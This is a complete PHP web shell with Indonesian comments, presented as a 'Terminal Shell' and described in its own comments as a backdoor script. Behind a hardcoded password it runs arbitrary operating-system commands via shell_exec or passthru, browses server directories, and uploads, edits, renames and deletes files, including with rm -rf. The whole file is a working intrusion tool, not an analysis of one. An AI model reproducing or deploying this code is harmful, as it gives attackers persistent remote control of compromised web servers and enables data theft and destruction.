<?php
// Mulai sesi untuk mempertahankan status login
session_start();

// Kata sandi HARUS diubah
$password = 'new_secret_code';

// Fungsi untuk membersihkan input agar aman untuk ditampilkan di HTML
function clean_html($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

// Fungsi untuk eksekusi perintah sistem
function execute_command($cmd) {
    // Escaping argumen untuk keamanan (meskipun ini skrip backdoor, praktik ini baik)
    if (function_exists('shell_exec')) {
        return clean_html(shell_exec($cmd));
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
        return clean_html($output);
    } else {
        return "ERROR: Fungsi eksekusi perintah (shell_exec/passthru) dinonaktifkan.";
    }
}

// --- Otentikasi Sesi ---
if (isset($_POST['password']) && $_POST['password'] === $password) {
    $_SESSION['auth'] = true;
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    // Tampilan login sederhana
    echo '<!DOCTYPE html><html><head><title>Login</title></head><body><form method="POST">Password: <input type="password" name="password"><input type="submit" value="Login"></form></body></html>';
    exit;
}

// --- Menangani Navigasi Folder & Aksi File ---
$output_message = "";
$current_dir = getcwd();

// Pindah Folder: Menggunakan parameter GET 'dir'
if (isset($_GET['dir'])) {
    $target_dir = $_GET['dir'];
    // Sanitasi dan validasi path untuk mencegah Directory Traversal (walaupun ini backdoor)
    if (realpath($target_dir) !== false) {
        $current_dir = realpath($target_dir);
    }
}
// Set direktori kerja ke yang baru
@chdir($current_dir);
$current_dir = getcwd(); // Ambil path absolut yang sudah diubah

// Pemrosesan aksi POST
if (isset($_POST['command']) && !empty($_POST['command'])) {
    $output_message = execute_command($_POST['command']);
} 
elseif (isset($_POST['action'])) {
    // Sanitasi input form
    $file = isset($_POST['file']) ? $_POST['file'] : '';
    $new_name = isset($_POST['new_name']) ? $_POST['new_name'] : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';

    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file_upload'])) {
                $target_file = basename($_FILES['file_upload']['name']);
                if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
                    $output_message = "File " . clean_html($target_file) . " berhasil diunggah.";
                } else {
                    $output_message = "Gagal mengunggah file.";
                }
            }
            break;
        case 'mkdir':
            $output_message = execute_command("mkdir " . escapeshellarg($file));
            break;
        case 'rm':
            $output_message = execute_command("rm -rf " . escapeshellarg($file));
            break;
        case 'rename':
            $output_message = execute_command("mv " . escapeshellarg($file) . " " . escapeshellarg($new_name));
            break;
        case 'touch':
             $output_message = execute_command("touch " . escapeshellarg($file));
             break;
        case 'edit_save':
            if (@file_put_contents($file, $content) !== false) {
                $output_message = "File " . clean_html($file) . " berhasil disimpan.";
            } else {
                $output_message = "Gagal menyimpan file.";
            }
            break;
    }
}

// --- Tampilan HTML ---
?>
<!DOCTYPE html>
<html>
<head>
    <title>CMD Shell</title>
    <style>
        body{font-family: monospace; background-color: #212121; color: #4CAF50; padding: 20px;}
        .container{max-width: 1200px; margin: 0 auto; background-color: #1a1a1a; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,255,0,0.3);}
        h1{color: #FFC107; border-bottom: 2px solid #4CAF50; padding-bottom: 10px;}
        .section{margin-bottom: 20px; padding: 10px; border: 1px dashed #616161; border-radius: 5px;}
        input[type="text"], input[type="file"], textarea{width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 10px; border-radius: 4px; border: 1px solid #4CAF50; background-color: #333; color: #fff; box-sizing: border-box;}
        input[type="submit"], button{background-color: #4CAF50; color: black; padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer;}
        a{color: #FFC107; text-decoration: none;}
        a:hover{color: #FFEB3B;}
        pre{background-color: #333; padding: 15px; border-radius: 5px; overflow-x: auto;}
        .error{color: #FF5722;}
    </style>
</head>
<body>
<div class="container">
    <h1>Terminal Shell</h1>
    <h2>Current Dir: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">..</a> / <?php echo clean_html($current_dir); ?></h2>

    <?php if ($output_message): ?>
        <div class="section">
            <pre><?php echo $output_message; ?></pre>
        </div>
    <?php endif; ?>

    <div class="section">
        <h3>Execute Command</h3>
        <form method="POST">
            <input type="text" name="command" placeholder="Enter command (e.g., ls -la, whoami)" autofocus>
            <input type="submit" value="Run">
        </form>
    </div>

    <div class="section">
        <h3>File Actions</h3>
        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
            <form method="POST" enctype="multipart/form-data">
                <h4>1. Upload File</h4>
                <input type="hidden" name="action" value="upload">
                <input type="file" name="file_upload">
                <input type="submit" value="Upload">
            </form>
            
            <div>
                <h4>2. Create File & Folder</h4>
                <form method="POST" style="margin-bottom: 5px;">
                    <input type="hidden" name="action" value="touch">
                    <input type="text" name="file" placeholder="File Name">
                    <input type="submit" value="Create File">
                </form>
                <form method="POST">
                    <input type="hidden" name="action" value="mkdir">
                    <input type="text" name="file" placeholder="Folder Name">
                    <input type="submit" value="Create Folder">
                </form>
            </div>

            <form method="POST">
                <h4>3. Rename</h4>
                <input type="hidden" name="action" value="rename">
                <input type="text" name="file" placeholder="Old Name">
                <input type="text" name="new_name" placeholder="New Name">
                <input type="submit" value="Rename">
            </form>
            
            <form method="POST">
                <h4>4. Delete (rm -rf)</h4>
                <input type="hidden" name="action" value="rm">
                <input type="text" name="file" placeholder="File/Folder Path">
                <input type="submit" value="DELETE">
            </form>
        </div>
    </div>

    <div class="section">
        <h3>File Listing (ls -la)</h3>
        <pre>
<?php 
// Mendapatkan daftar file menggunakan PHP untuk membuat tautan navigasi
$all_entries = @scandir('.');
if ($all_entries) {
    $folders = [];
    $files = [];

    foreach ($all_entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (@is_dir($entry)) {
            $folders[] = $entry;
        } else {
            $files[] = $entry;
        }
    }
    
    sort($folders);
    sort($files);

    foreach ($folders as $folder) {
        // Tautan navigasi folder
        echo "[DIR] <a href=\"?dir=" . urlencode(realpath($folder)) . "\">" . clean_html($folder) . "</a><br>";
    }

    foreach ($files as $file) {
        // Tautan edit file
        echo "[FILE] " . clean_html($file) . " (<a href=\"?dir=" . urlencode($current_dir) . "&edit=" . urlencode($file) . "\">Edit</a>)<br>";
    }
} else {
    echo "Gagal membaca direktori.";
}
?>
        </pre>
    </div>

    <?php if (isset($_GET['edit'])): ?>
        <?php $edit_file = $_GET['edit']; ?>
        <div class="section">
            <h3>Edit File: <?php echo clean_html($edit_file); ?></h3>
            <form method="POST">
                <input type="hidden" name="action" value="edit_save">
                <input type="hidden" name="file" value="<?php echo clean_html($edit_file); ?>">
                <textarea name="content" rows="20"><?php echo clean_html(@file_get_contents($edit_file)); ?></textarea>
                <input type="submit" value="Save Changes">
            </form>
        </div>
    <?php endif; ?>

</div>
</body>
</html>
